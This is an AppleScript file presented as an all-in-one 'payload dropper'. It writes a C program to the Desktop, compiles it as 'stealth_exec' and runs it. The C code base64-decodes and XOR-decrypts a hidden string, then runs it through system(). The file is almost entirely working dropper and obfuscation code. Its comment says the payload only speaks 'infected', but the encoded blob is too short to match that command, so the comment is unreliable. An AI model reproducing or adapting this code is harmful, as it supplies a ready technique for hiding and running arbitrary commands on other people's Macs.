-- 🧬 All-in-one AppleScript: payload dropper + compiler + runtime decryption
-- Drops an obfuscated C file, compiles it, decrypts payload at runtime, then runs it

set cCode to "
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define XOR_KEY 0x5A

const char *obfuscated_b64 = \"Q1lZR1sYUE0NXAxFVx0=\"; // XOR+base64 of: osascript -e 'say infected'

static const char b64_table[256] = {
  ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,
  ['N']=13,['O']=14,['P']=15,['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,['Y']=24,['Z']=25,
  ['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,
  ['m']=38,['n']=39,['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,['w']=48,['x']=49,
  ['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,
  ['+']=62,['/']=63
};

void base64_decode(const char *in, unsigned char *out, size_t *outlen) {
    int len = strlen(in), j = 0;
    for (int i = 0; i < len; i += 4) {
        out[j++] = (b64_table[in[i]] << 2) | (b64_table[in[i+1]] >> 4);
        if (in[i+2] != '=') out[j++] = (b64_table[in[i+1]] << 4) | (b64_table[in[i+2]] >> 2);
        if (in[i+3] != '=') out[j++] = (b64_table[in[i+2]] << 6) | b64_table[in[i+3]];
    }
    *outlen = j;
}

void decrypt_and_exec() {
    unsigned char decoded[256];
    size_t outlen = 0;
    base64_decode(obfuscated_b64, decoded, &outlen);
    for (size_t i = 0; i < outlen; i++) decoded[i] ^= XOR_KEY;
    decoded[outlen] = '\\0';
    system((char *)decoded);
}

int main() {
    decrypt_and_exec();
    return 0;
}
"

-- 🔧 Write to Desktop
set desktop to POSIX path of (path to desktop folder)
set src to desktop & "stealth_exec.c"
do shell script "echo " & quoted form of cCode & " > " & quoted form of src

-- 🛠 Compile to Mach-O binary
set bin to desktop & "stealth_exec"
do shell script "clang -o " & quoted form of bin & " " & quoted form of src

-- 🚀 Execute binary (decrypts and runs obfuscated payload in memory)
do shell script quoted form of bin
